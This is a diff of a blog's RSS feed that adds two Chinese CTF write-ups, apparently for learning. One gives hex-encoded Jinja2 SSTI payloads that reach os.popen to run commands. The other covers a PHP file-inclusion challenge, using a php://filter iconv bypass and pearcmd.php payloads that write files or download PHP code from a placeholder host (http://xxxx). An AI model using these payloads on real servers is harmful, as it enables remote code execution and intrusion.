@@ -92,6 +92,8 @@
         <category>sqlmap使用</category>
         <category>SQL注入</category>
         <category>文件包含</category>
+        <category>php伪协议</category>
+        <category>pearcmd文件包含</category>
         <item>
             <guid isPermalink="true">http://odiws.github.io/2025/02/26/HMGCTF2022-Fan-Website/</guid>
             <title>[HMGCTF2022]Fan_Website</title>
@@ -260,6 +262,39 @@ ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#39;(1 + ~(0))&#39
 &lt;p&gt;获取密码登录即可&lt;/p&gt;
 &lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202502092209942.png&#34; alt=&#34;image-20250209220955859&#34;&gt;&lt;/p&gt;
 &lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zeXVuYWh0LmNvbS9wLzM4MDk2MDU5ODIuaHRtbA==&#34;&gt;https://syunaht.com/p/3809605982.html&lt;/span&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://odiws.github.io/2025/01/26/NewStarCTF2023%E6%96%B0%E7%94%9F%E8%B5%9B-BabySSTI-Three/</guid>
+            <title>NewStarCTF2023新生赛_BabySSTI_Three</title>
+            <link>http://odiws.github.io/2025/01/26/NewStarCTF2023%E6%96%B0%E7%94%9F%E8%B5%9B-BabySSTI-Three/</link>
+            <category>buuctf</category>
+            <category>ssti</category>
+            <pubDate>Sun, 26 Jan 2025 22:04:33 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;NewStarCTF2023 新生赛_BabySSTI_Three&lt;/p&gt;
+&lt;p&gt;之前用的是字符串逆序绕过，这里过滤了:，然后用十六进制绕过即可&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;def hex_payload(payload):
+	res_payload = &#39;&#39;
+	for i in payload:
+		i = &amp;quot;\\x&amp;quot; + hex(ord(i))[2:]
+		res_payload += i
+	print(&#39;[+]&amp;quot;&amp;#123;&amp;#125;&amp;quot; Convert to hex: &amp;quot;&amp;#123;&amp;#125;&amp;quot;&#39;.format(payload,res_payload))
+
+if __name__ == &#39;__main__&#39;:
+	payload = &amp;quot;__class__&amp;quot;
+	hex_payload(payload)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#123;&amp;#123;&#39;&#39;[&#39;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&#39;][&#39;\x5f\x5f\x62\x61\x73\x65\x73\x5f\x5f&#39;][0]&amp;#125;&amp;#125;
+
+&amp;#123;&amp;#123;&#39;&#39;[&#39;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&#39;][&#39;\x5f\x5f\x62\x61\x73\x65\x73\x5f\x5f&#39;][0][&#39;\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f&#39;]()&amp;#125;&amp;#125;
+
+&amp;#123;&amp;#123;&#39;&#39;[&#39;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&#39;][&#39;\x5f\x5f\x62\x61\x73\x65\x73\x5f\x5f&#39;][0][&#39;\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f&#39;]()[117][&#39;\x5f\x5f\x69\x6e\x69\x74\x5f\x5f&#39;][&#39;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&#39;][&#39;\x70\x6f\x70\x65\x6e&#39;](&#39;id&#39;).read()&amp;#125;&amp;#125;
+
+&amp;#123;&amp;#123;&#39;&#39;[&#39;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&#39;][&#39;\x5f\x5f\x62\x61\x73\x65\x73\x5f\x5f&#39;][0][&#39;\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f&#39;]()[117][&#39;\x5f\x5f\x69\x6e\x69\x74\x5f\x5f&#39;][&#39;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&#39;][&#39;\x70\x6f\x70\x65\x6e&#39;](&#39;tail$&amp;#123;IFS&amp;#125;/fl*&#39;).read()&amp;#125;&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;有了命令执行之后还需要有点绕过即可读取到 flag&lt;br&gt;
+&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202501262206487.png&#34; alt=&#34;image-20250126220622301&#34;&gt;&lt;/p&gt;
+&lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vY2h1Nzc3Nzc3Ny9hcnRpY2xlL2RldGFpbHMvMTI3MzU0NDky&#34;&gt;BUUCTF NewStarCTF 公开赛赛道 Week5 Writeup_buuctf week5-CSDN 博客&lt;/span&gt;&lt;/p&gt;
  ]]></description>
         </item>
         <item>
@@ -1190,6 +1225,102 @@ sqlite 中没有 &lt;code&gt;ascii&lt;/code&gt; ，用 &lt;code&gt;unicode&lt;/c
 &lt;p&gt;这个姿势并不是新东西，在 upload-labs17 和 DDCTF 都出现过，没做出来还是说明题刷少了&lt;/p&gt;
 &lt;p&gt;另外还有其他图片的二次渲染具体可以看看：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc3Fsc2VjLmNvbS8yMDIwLzEwL3VwbG9hZC5odG1sI3RvYy1oZWFkaW5nLTE3&#34;&gt;https://www.sqlsec.com/2020/10/upload.html#toc-heading-17&lt;/span&gt;&lt;/p&gt;
 &lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLndoMXNwZXIuY29tL3Bvc3RzL2Npc2NuLTIwMjEtcXVhbHMtd3JpdGV1cC8jdXBsb2Fk&#34;&gt;https://blog.wh1sper.com/posts/ciscn-2021-quals-writeup/#upload&lt;/span&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://odiws.github.io/2024/10/23/NewStarCTF2023%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-include0%E3%80%820/</guid>
+            <title>[NewStarCTF2023公开赛道]include0。0</title>
+            <link>http://odiws.github.io/2024/10/23/NewStarCTF2023%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-include0%E3%80%820/</link>
+            <category>buuctf</category>
+            <category>php伪协议</category>
+            <category>pearcmd文件包含</category>
+            <pubDate>Wed, 23 Oct 2024 22:18:34 +0800</pubDate>
+            <description><![CDATA[ &lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;highlight_file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;__FILE__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// FLAG in the flag.php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;file&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;/base|rot/i&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    @&lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;nope&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;convert.iconv.* 过滤器，语法为&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;convert.iconv.&amp;lt;input-encoding&amp;gt;.&amp;lt;output-encoding&amp;gt; 
+    或
+convert.iconv.&amp;lt;input-encoding&amp;gt;/&amp;lt;output-encoding&amp;gt;  （两种写法的语义都相同）。 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;input-encoding&gt;和&lt;output-encoding&gt; 就是编码方式，有如下几种；&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;UCS-4*
+UCS-4BE
+UCS-4LE*
+UCS-2
+UCS-2BE
+UCS-2LE
+UTF-32*
+UTF-32BE*
+UTF-32LE*
+UTF-16*
+UTF-16BE*
+UTF-16LE*
+UTF-7
+UTF7-IMAP
+UTF-8*
+ASCII*
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里构造&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;?file=php://filter/convert.iconv.utf-8.utf-7/resource=flag.php
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;+ADw?php //flag+AHs-d9c5b463-4d11-4acc-9ebe-9e61a2388871+AH0
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;flag&amp;#123;d9c5b463-4d11-4acc-9ebe-9e61a2388871&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzY2MDEzOTQ4L2FydGljbGUvZGV0YWlscy8xMzQxOTM0NTE=&#34;&gt;https://blog.csdn.net/qq_66013948/article/details/134193451&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;这个还只是一个非预期解：&lt;/p&gt;
+&lt;p&gt;可以利用 pearcmd 进行写文件操作：&lt;/p&gt;
+&lt;p&gt;直接 payload：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;?+config-create+/&amp;amp;file=/usr/local/lib/php/pearcmd.php&amp;amp;/&amp;lt;?=phpinfo()?&amp;gt;+/tmp/hello.php
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202410272147514.png&#34; alt=&#34;image-20241027214750168&#34;&gt;&lt;/p&gt;
+&lt;p&gt;直接？file=/tmp/hello.php&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202410272148284.png&#34; alt=&#34;image-20241027214831959&#34;&gt;&lt;/p&gt;
+&lt;p&gt;直接出了&lt;/p&gt;
+&lt;p&gt;pearcmd 文件包含：&lt;/p&gt;
+&lt;h2 id=&#34;简介&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h2&gt;
+&lt;p&gt;pecl 是 PHP 中用于管理扩展而使用的命令行工具，而 pear 是 pecl 依赖的类库。在 7.3 及以前，pecl/pear 是默认安装的；&lt;/p&gt;
+&lt;p&gt;在 7.4 及以后，需要我们在编译 PHP 的时候指定 —with-pear 才会安装。&lt;/p&gt;
+&lt;p&gt;不过，在 Docker 任意版本镜像中，pcel/pear 都会被默认安装，安装的路径在 &lt;code&gt;/usr/local/lib/php&lt;/code&gt; 。&lt;/p&gt;
+&lt;p&gt;要利用这个 &lt;code&gt;pearcmd.php&lt;/code&gt;  需要满足几个条件：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;要开启 register_argc_argv, 这个选项在 Docker 中使自动开启的&lt;/li&gt;
+&lt;li&gt;要有文件包含的利用&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;现在大部分 CTF 的环境都是利用 docker 搭建的，而现在的 PHP 题目的版本很大部分在 7.4 以上，所以这个利用的范围还是挺大的，可以试试。&lt;/p&gt;
+&lt;h2 id=&#34;利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用&#34;&gt;#&lt;/a&gt; 利用&lt;/h2&gt;
+&lt;p&gt;环境就先使用 php7.4 进行测试&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://shad0wwalker.com/img/pearcmd/image-20240401163215420.png&#34;&gt;&lt;img data-src=&#34;https://shad0wwalker.com/img/pearcmd/image-20240401163215420.png&#34; alt=&#34;image-20240401163215420&#34;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;HTTP 数据包中的 query-string 会被作为 &lt;code&gt;argv&lt;/code&gt; , 在 docker 下复现 pearcmd 应该是可行的，当然默认也存在 pearcmd。&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://shad0wwalker.com/img/pearcmd/image-20240401163503871.jpg&#34;&gt;&lt;img data-src=&#34;https://shad0wwalker.com/img/pearcmd/image-20240401163503871.jpg&#34; alt=&#34;image-20240401163503871&#34;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;config-create&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#config-create&#34;&gt;#&lt;/a&gt; config-create&lt;/h3&gt;
+&lt;p&gt;利用 payload:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;复制成功?+config-create+/&amp;amp;file=/usr/local/lib/php/pearcmd.php&amp;amp;/&amp;lt;?=phpinfo()?&amp;gt;+/tmp/hello.php
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;a href=&#34;https://shad0wwalker.com/img/pearcmd/image-20240401164114591.jpg&#34;&gt;&lt;img data-src=&#34;https://shad0wwalker.com/img/pearcmd/image-20240401164114591.jpg&#34; alt=&#34;image-20240401164114591&#34;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;文件包含的点是 &lt;code&gt;?file=&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;成功写入文件&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://shad0wwalker.com/img/pearcmd/image-20240401164343565.png&#34;&gt;&lt;img data-src=&#34;https://shad0wwalker.com/img/pearcmd/image-20240401164343565.png&#34; alt=&#34;image-20240401164343565&#34;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;使用的是 &lt;code&gt;PEAR_Config&lt;/code&gt;  的形式，方法来自 p 神博客。&lt;/p&gt;
+&lt;h3 id=&#34;install&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#install&#34;&gt;#&lt;/a&gt; install&lt;/h3&gt;
+&lt;p&gt;还有&lt;a href=&#34;https://blog.szfszf.top/article/57/&#34;&gt; &lt;code&gt;install&lt;/code&gt;  形式&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;pear install http://xxxx/test.php&lt;/code&gt;  就可以下载 php 文件，还可以用 &lt;code&gt;--installroot&lt;/code&gt;  指定目录，这样可以构造 payload：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;?+install+--installroot+&amp;amp;file=/usr/local/lib/php/pearcmd.php&amp;amp;+http://xxxx/test1.php
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这个 payload 会将文件下载到网站目录的 &lt;code&gt;&amp;amp;file=/usr/local/lib/php/pearcmd.php\&amp;amp;/tmp/pear/download/&lt;/code&gt;  文件夹下，构造非常巧妙，访问时需要 url 编码，好处是可以直接访问到文件，不需要包含，当然可能存在没有写权限的情况，就需要另外构造：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;?+install+--installroot+/tmp/testinstall+http://localhost/index.html+&amp;amp;file=/usr/local/lib/php/pearcmd.php
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这个 payload 会将文件下载到 &lt;code&gt;/tmp/testinstall/tmp/pear/download&lt;/code&gt;  下，当然还有别的形式:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;?+install+http://localhost/index.html+&amp;amp;file=/usr/local/lib/php/pearcmd.php
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这个 payload 会将文件下载到 &lt;code&gt;/tmp/pear/download&lt;/code&gt;  下。&lt;/p&gt;
+&lt;h3 id=&#34;download&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#download&#34;&gt;#&lt;/a&gt; download&lt;/h3&gt;
+&lt;p&gt;还有 &lt;code&gt;dowanload&lt;/code&gt;  形式，参考了：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93NHJzcDF0My5tb2UvMjAyMS8xMS8yNi8lRTUlODUlQjMlRTQlQkElOEUlRTUlODglQTklRTclOTQlQThwZWFyY21kJUU4JUJGJTlCJUU4JUExJThDJUU2JTk2JTg3JUU0JUJCJUI2JUU1JThDJTg1JUU1JTkwJUFCJUU3JTlBJTg0JUU0JUI4JTgwJUU0JUJBJTlCJUU2JTgwJUJCJUU3JUJCJTkzLyNtb3Jl&#34;&gt;关于利用 pearcmd 进行文件包含的一些总结 | W4rsp1t3’s blog&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;非常聪明的构造：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;?+download+http://xxxx/test1.php&amp;amp;file=/usr/local/lib/php/pearcmd.php
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;原命令是 &lt;code&gt;pear download url&lt;/code&gt; ，和之前的 install 一样， &lt;code&gt;&amp;amp;file=/usr/local/lib/php/pearcmd.php&lt;/code&gt;  这一部分会被加入 &lt;code&gt;pear&lt;/code&gt;  执行的参数中，在我们的服务器上构造会返回恶意代码的 url： &lt;code&gt;test1.php&amp;amp;file=/usr/local/lib/php/pearcmd.php&lt;/code&gt;  即可。&lt;/p&gt;
+&lt;p&gt;可以将文件写到当前网站目录下。&lt;/p&gt;
+&lt;p&gt;当然可能还有别的利用手段需要进一步挖掘。&lt;/p&gt;
+&lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zaGFkMHd3YWxrZXIuY29tL3Bvc3RzLzIxNTE1OTExNjEuaHRtbA==&#34;&gt;文件包含经典之 pearcmd 的妙用 | Shad0wwalker’s blog&lt;/span&gt;&lt;/p&gt;
  ]]></description>
         </item>
         <item>
